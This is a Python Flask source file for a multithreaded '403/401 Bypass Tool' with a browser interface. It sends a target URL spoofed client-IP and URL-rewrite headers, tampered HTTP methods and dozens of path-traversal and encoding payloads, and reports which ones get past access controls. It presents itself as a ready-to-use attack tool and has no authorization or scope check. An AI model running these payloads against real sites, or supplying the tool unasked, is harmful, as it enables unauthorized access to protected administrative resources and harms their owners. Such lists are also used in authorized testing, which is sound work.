#!/usr/bin/env python3
"""
403/401 Bypass Tool - Practical & Effective
Run: python bypass_tool_pro.py
"""

from flask import Flask, render_template_string, request, jsonify
import threading
import requests
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import webbrowser
import urllib.parse

requests.packages.urllib3.disable_warnings()
app = Flask(__name__)

# ============================================================
# CONFIGURATION
# ============================================================
REQUEST_TIMEOUT = 8
MAX_RETRIES = 1
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# ============================================================
# PAYLOADS (sourced from successful bypasses)
# ============================================================

# Common HTTP methods to test
HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]

# Headers that frequently bypass 403/401
BYPASS_HEADERS = {
    "X-Forwarded-For": ["127.0.0.1", "0.0.0.0", "localhost", "::1", "10.0.0.1"],
    "X-Real-IP": ["127.0.0.1", "0.0.0.0", "localhost"],
    "X-Originating-IP": ["127.0.0.1", "0.0.0.0"],
    "X-Remote-IP": ["127.0.0.1", "0.0.0.0"],
    "X-Remote-Addr": ["127.0.0.1", "0.0.0.0"],
    "X-Client-IP": ["127.0.0.1", "0.0.0.0"],
    "X-Host": ["127.0.0.1", "localhost"],
    "X-Forwarded-Host": ["127.0.0.1", "localhost"],
    "X-Original-URL": ["/admin"],
    "X-Rewrite-URL": ["/admin"],
    "X-Proxy-URL": ["/admin"],
    "X-Forwarded-Port": ["443", "80", "8080"],
    "X-Forwarded-Scheme": ["https", "http"],
    "X-Forwarded-Protocol": ["https", "http"],
    "Forwarded": ["for=127.0.0.1; by=127.0.0.1; proto=https"],
    "Client-IP": ["127.0.0.1", "0.0.0.0"],
    "True-Client-IP": ["127.0.0.1", "0.0.0.0"],
    "X-ProxyUser-Ip": ["127.0.0.1"],
    "X-Custom-IP-Authorization": ["127.0.0.1"]
}

# Path modifications that work in practice
PATH_MODIFICATIONS = [
    "",                  # original path
    "/.", "/../", "/%2e/", "/%2e%2e/", "/..;/", "/..%3B/",
    "/%2e%2e%2f", "/%252e%252e%252f", "/./", "//", "/;/",
    "/%61dmin/", "/%2561dmin/", "/ADMIN/", "/Admin/", "/aDmIn/",
    "/admin/..;/", "/admin/..%3b/", "/admin%2f..%2f",
    "/admin/.", "/admin/../", "/admin/%2e/", "/admin/%2e%2e/",
    "/%2fadmin%2f", "/%252fadmin%252f", "/%c0%ae%c0%ae/",
    "/admin.json", "/admin.xml", "/admin.txt", "/admin.html",
    "?/../", "/?/", "/#/", "/%20", "/%09", "/*/..", "/**/..",
    "/admin%2f", "/admin%252f", "/%61%64%6d%69%6e/",
    "/%5cadmin%5c", "/admin..;/", "/././admin/././", "//admin//",
    "/.;/admin", "/admin/.;", "/admin/backup", "/admin/old",
    "/admin/index.html", "/admin/index.php", "/admin/login",
    "?debug=true", "?admin=true", "?access=1", "&bypass=1"
]

# ============================================================
# SCANNER ENGINE
# ============================================================

scan_running = False
current_progress = 0
total_tests = 0
stop_flag = False
target_url = ""
proxy_dict = None
delay_sec = 0.0
threads_num = 10
original_status = None
original_length = None
original_content = None
scan_results = []
live_log = []
log_lock = threading.Lock()

def add_log(msg):
    with log_lock:
        live_log.append(f"[{time.strftime('%H:%M:%S')}] {msg}")
        if len(live_log) > 200:
            live_log.pop(0)

def safe_request(method, url, headers, data=None):
    """Make a request that won't hang"""
    for attempt in range(MAX_RETRIES + 1):
        try:
            session = requests.Session()
            session.keep_alive = False
            
            req = requests.Request(method, url, headers=headers, data=data)
            prep = session.prepare_request(req)
            resp = session.send(prep, timeout=REQUEST_TIMEOUT, verify=False, 
                               allow_redirects=False)
            session.close()
            return resp.status_code, len(resp.content), resp.content, resp.url
        except requests.exceptions.Timeout:
            if attempt == MAX_RETRIES:
                return None, 0, b'', url
            time.sleep(0.3)
        except Exception:
            if attempt == MAX_RETRIES:
                return None, 0, b'', url
            time.sleep(0.3)
    return None, 0, b'', url

def test_request(method, url, headers, test_desc):
    """Test one request and return result if bypass found"""
    global stop_flag, delay_sec, original_status, original_length, original_content
    
    if stop_flag:
        return None
    
    if delay_sec > 0:
        time.sleep(delay_sec)
    
    status, length, content, final_url = safe_request(method, url, headers)
    
    if status is None:
        return None
    
    # Check for bypass: status changed from 403/401 to 2xx or 3xx
    if original_status in (403, 401):
        if status in (200, 201, 202, 204, 301, 302, 303, 307, 308):
            return (method, test_desc, headers, status, final_url, length)
        
        # Also detect if content changed significantly while still 200
        if status == 200 and original_content:
            # Simple check: content different
            if content and len(content) != original_length:
                if abs(len(content) - original_length) > 50:  # significant difference
                    return (method, test_desc, headers, status, final_url, length)
    
    # Also treat 401->403 or other status changes as interesting
    if original_status == 401 and status == 403:
        return (method, f"401→403: {test_desc}", headers, status, final_url, length)
    
    return None

# ============================================================
# SCANNER WORKER
# ============================================================

def scanner_worker():
    global scan_running, current_progress, total_tests, stop_flag
    global original_status, original_length, original_content, scan_results
    
    add_log(f"Target: {target_url}")
    
    # Get baseline
    status, length, content, _ = safe_request("GET", target_url, {})
    if status is None:
        add_log("ERROR: Cannot reach target")
        scan_running = False
        return
    
    original_status = status
    original_length = length
    original_content = content
    add_log(f"Baseline: {original_status} (length {original_length})")
    
    # Build test cases
    test_items = []
    
    # 1. Method tampering
    for method in HTTP_METHODS:
        test_items.append((method, target_url, {}, f"Method: {method}"))
    
    # 2. Header bypasses
    for header, values in BYPASS_HEADERS.items():
        for value in values:
            headers = {header: value}
            test_items.append(("GET", target_url, headers, f"Header: {header}: {value}"))
    
    # 3. Path modifications
    for mod in PATH_MODIFICATIONS:
        if mod:
            modified_url = target_url.rstrip('/') + mod
            test_items.append(("GET", modified_url, {}, f"Path: {mod}"))
    
    # 4. Combinations: method + header
    for method in ["GET", "POST"]:
        headers = {"X-Forwarded-For": "127.0.0.1"}
        test_items.append((method, target_url, headers, f"Method+Header: {method} + X-Forwarded-For"))
    
    total_tests = len(test_items)
    current_progress = 0
    stop_flag = False
    found_bypasses = []
    
    add_log(f"Starting scan with {threads_num} threads. {total_tests} tests...")
    
    with ThreadPoolExecutor(max_workers=threads_num) as executor:
        future_to_idx = {}
        for idx, (method, url, headers, desc) in enumerate(test_items):
            future = executor.submit(test_request, method, url, headers, desc)
            future_to_idx[future] = idx
        
        for future in as_completed(future_to_idx):
            if stop_flag:
                executor.shutdown(wait=False, cancel_futures=True)
                break
            
            idx = future_to_idx[future]
            current_progress = idx + 1
            result = future.result()
            
            if result:
                method, desc, headers, status, final_url, length = result
                bypass_info = {
                    "method": method,
                    "description": desc,
                    "status": status,
                    "url": final_url,
                    "headers": str(headers),
                    "length": length
                }
                found_bypasses.append(bypass_info)
                scan_results = found_bypasses[-100:]
                add_log(f"✓ BYPASS! [{status}] {method} - {desc[:80]}")
                add_log(f"  → {final_url[:100]}")
    
    if not stop_flag:
        add_log(f"Scan completed. Found {len(found_bypasses)} bypasses.")
    scan_running = False

# ============================================================
# WEB INTERFACE
# ============================================================

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>403/401 Bypass Tool - Professional</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: 'Consolas', monospace; background: #1a1a2e; color: #eee; padding: 20px; margin: 0; }
        .container { max-width: 1400px; margin: auto; }
        h1 { color: #e94560; border-left: 4px solid #e94560; padding-left: 15px; }
        .card { background: #16213e; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
        .flex-row { display: flex; gap: 15px; flex-wrap: wrap; align-items: flex-end; }
        input, select, button, textarea { background: #0f3460; border: 1px solid #e94560; color: white; padding: 10px 15px; border-radius: 8px; font-family: monospace; }
        button { background: #e94560; cursor: pointer; font-weight: bold; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .progress-bar { background: #0f3460; border-radius: 10px; margin: 10px 0; }
        .progress-fill { background: #4ade80; width: 0%; height: 25px; border-radius: 10px; text-align: center; line-height: 25px; }
        .log { background: #0f3460; border-radius: 8px; padding: 10px; height: 250px; overflow-y: auto; font-size: 12px; }
        .result { border-left: 3px solid #4ade80; padding: 10px; margin: 8px 0; background: #0f3460; border-radius: 4px; }
        .result-status { color: #4ade80; font-weight: bold; }
        .result-url { font-size: 11px; color: #aaa; word-break: break-all; }
        .bypass-count { font-size: 24px; font-weight: bold; color: #4ade80; }
        hr { border-color: #e94560; }
        .notice { background: #1f1f3a; border-left: 4px solid #e94560; padding: 10px; margin-bottom: 15px; font-size: 13px; }
    </style>
</head>
<body>
<div class="container">
    <h1>403/401 Bypass Tool</h1>
    <div class="notice">
        ✅ Scans multiple endpoints automatically | ⏱️ 8-second timeout | 🧵 Multi-threaded<br>
        🔍 Tests: HTTP methods, headers, path modifications, protocol downgrades
    </div>

    <div class="card">
        <div class="flex-row">
            <input type="text" id="target" style="flex:3" placeholder="https://target.com/admin" value="">
            <input type="text" id="proxy" style="flex:1" placeholder="Proxy (http://...)" value="">
            <label>🧵 Threads: <input type="number" id="threads" value="15" step="5" style="width: 70px;"></label>
            <label>⏱️ Delay: <input type="number" id="delay" value="0" step="0.1" style="width: 70px;"></label>
        </div>
        <div class="flex-row" style="margin-top: 15px;">
            <button id="startBtn">▶ START SCAN</button>
            <button id="stopBtn" disabled>⏹ STOP</button>
            <button id="exportBtn" disabled>💾 Export Results</button>
            <span id="statusBadge" style="background: #333; padding: 8px 15px; border-radius: 20px;">⚪ Ready</span>
        </div>
    </div>

    <div class="card">
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <h3>Progress</h3>
            <span id="foundCount" class="bypass-count">0</span>
        </div>
        <div class="progress-bar"><div class="progress-fill" id="progressFill">0%</div></div>
        <div id="statusText" style="margin-top: 10px;"></div>
    </div>

    <div class="card">
        <h3>Live Log</h3>
        <div id="log" class="log"></div>
    </div>

    <div class="card">
        <h3>Successful Bypasses</h3>
        <div id="results" class="log"></div>
    </div>
</div>

<script>
    let pollInterval = null;

    function startScan() {
        const target = document.getElementById('target').value.trim();
        if (!target) { alert("Please enter a target URL"); return; }
        
        const proxy = document.getElementById('proxy').value;
        const threads = parseInt(document.getElementById('threads').value);
        const delay = parseFloat(document.getElementById('delay').value);

        fetch('/start', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({target, proxy, threads, delay})
        }).then(r => r.json()).then(data => {
            if (data.status === 'ok') {
                document.getElementById('startBtn').disabled = true;
                document.getElementById('stopBtn').disabled = false;
                document.getElementById('exportBtn').disabled = true;
                document.getElementById('statusBadge').innerHTML = '🟢 Scanning';
                if (pollInterval) clearInterval(pollInterval);
                pollInterval = setInterval(fetchStatus, 1200);
            } else alert("Error: " + data.error);
        });
    }

    function stopScan() {
        fetch('/stop').then(() => {
            clearInterval(pollInterval);
            pollInterval = null;
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
            document.getElementById('exportBtn').disabled = false;
            document.getElementById('statusBadge').innerHTML = '⏹ Stopped';
        });
    }

    function exportResults() {
        fetch('/export').then(r => r.json()).then(data => {
            if (data.results && data.results.length) {
                let text = data.results.map(r => `[${r.status}] ${r.method} - ${r.description}\\n  → ${r.url}`).join('\\n\\n');
                const blob = new Blob([text], {type: 'text/plain'});
                const a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = `bypass_${new Date().toISOString().slice(0,19)}.txt`;
                a.click();
                URL.revokeObjectURL(a.href);
            } else alert("No results to export");
        });
    }

    function fetchStatus() {
        fetch('/status').then(r => r.json()).then(data => {
            const percent = data.total > 0 ? (data.progress / data.total * 100).toFixed(1) : 0;
            document.getElementById('progressFill').style.width = percent + '%';
            document.getElementById('progressFill').innerHTML = percent + '%';
            document.getElementById('statusText').innerHTML = data.running ? `Scanning... ${data.progress}/${data.total}` : (data.progress === data.total ? "Scan completed." : "Ready.");
            document.getElementById('foundCount').innerHTML = data.results.length;

            if (data.log && data.log.length) {
                let logHtml = '';
                data.log.slice(-50).forEach(l => { logHtml += `<div>${escapeHtml(l)}</div>`; });
                document.getElementById('log').innerHTML = logHtml;
            }

            if (data.results.length) {
                let resHtml = '';
                data.results.slice().reverse().forEach(r => {
                    resHtml += `<div class="result">
                        <span class="result-status">[${r.status}]</span> <strong>${r.method}</strong> - ${escapeHtml(r.description)}<br>
                        <div class="result-url">→ ${escapeHtml(r.url)}</div>
                    </div>`;
                });
                document.getElementById('results').innerHTML = resHtml;
            }

            if (!data.running && data.progress === data.total) {
                if (pollInterval) clearInterval(pollInterval);
                pollInterval = null;
                document.getElementById('startBtn').disabled = false;
                document.getElementById('stopBtn').disabled = true;
                document.getElementById('exportBtn').disabled = false;
                document.getElementById('statusBadge').innerHTML = '✅ Done';
            }
        });
    }

    function escapeHtml(str) {
        return str.replace(/[&<>]/g, function(m) {
            return {'&':'&amp;','<':'&lt;','>':'&gt;'}[m];
        });
    }

    document.getElementById('startBtn').onclick = startScan;
    document.getElementById('stopBtn').onclick = stopScan;
    document.getElementById('exportBtn').onclick = exportResults;
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/start', methods=['POST'])
def start():
    global scan_running, target_url, proxy_dict, delay_sec, threads_num, stop_flag, current_progress, scan_results, live_log
    if scan_running:
        return jsonify({"status": "error", "error": "Scan already running"})
    
    data = request.json
    target = data.get('target')
    if not target:
        return jsonify({"status": "error", "error": "Target required"})
    
    target_url = target
    proxy = data.get('proxy')
    proxy_dict = {'http': proxy, 'https': proxy} if proxy else None
    delay_sec = float(data.get('delay', 0))
    threads_num = int(data.get('threads', 15))
    
    stop_flag = False
    scan_running = True
    current_progress = 0
    scan_results = []
    
    with log_lock:
        live_log.clear()
    
    thread = threading.Thread(target=scanner_worker)
    thread.daemon = True
    thread.start()
    return jsonify({"status": "ok"})

@app.route('/stop')
def stop():
    global stop_flag, scan_running
    stop_flag = True
    scan_running = False
    return jsonify({"status": "ok"})

@app.route('/status')
def status():
    global scan_running, current_progress, total_tests, scan_results, live_log
    with log_lock:
        log_copy = live_log.copy()
    return jsonify({
        "running": scan_running,
        "progress": current_progress,
        "total": total_tests,
        "results": scan_results[-100:],
        "log": log_copy[-50:]
    })

@app.route('/export')
def export():
    global scan_results
    return jsonify({"results": scan_results})

if __name__ == '__main__':
    print("\n" + "="*60)
    print("403/401 Bypass Tool - Practical Edition")
    print("="*60)
    print("Starting at http://localhost:5000")
    print("Ready. Enter a URL and click START.\n")
    webbrowser.open('http://localhost:5000')
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
